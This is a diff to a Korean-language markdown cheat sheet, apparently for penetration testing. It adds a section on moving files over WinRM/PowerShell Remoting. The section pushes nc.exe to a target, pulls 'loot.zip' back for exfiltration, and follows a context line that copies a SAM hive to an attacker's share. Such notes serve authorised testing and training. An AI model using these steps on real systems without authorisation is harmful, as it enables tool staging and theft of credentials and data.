@@ -134,6 +134,25 @@ copy C:\Windows\Temp\sam.hive \\tsclient\kali\
 
 주의 2: `\\tsclient\<공유명>` 경로는 **대소문자를 구분**한다. `/drive:kali,...`로 소문자로 지정했으면 윈도우 쪽에서도 `\\tsclient\kali`로(대문자 아님) 정확히 접근해야 한다 — 대문자로 치면 파일을 못 찾는 경우가 있다.
 
+## WinRM (PowerShell Remoting) 전송
+
+HTTP/SMB/RDP 가 다 막혀도 WinRM(5985 HTTP / 5986 HTTPS)이 열려 있으면 세션으로 복사한다. 관리자 또는 Remote Management Users 권한이 필요하다.
+
+```powershell
+# 포트 확인
+Test-NetConnection -ComputerName <대상> -Port 5985
+
+# 세션 생성 (자격증명 필요 시 -Credential 추가)
+$s = New-PSSession -ComputerName <대상>
+$s = New-PSSession -ComputerName <대상> -Credential (Get-Credential)
+
+# 보내기 (로컬 -> 세션)
+Copy-Item -Path C:\tools\nc.exe -ToSession $s -Destination C:\Temp\nc.exe
+
+# 가져오기 (세션 -> 로컬, 반출용)
+Copy-Item -FromSession $s -Path C:\Temp\loot.zip -Destination C:\
+```
+
 ---
 
 ## 팁
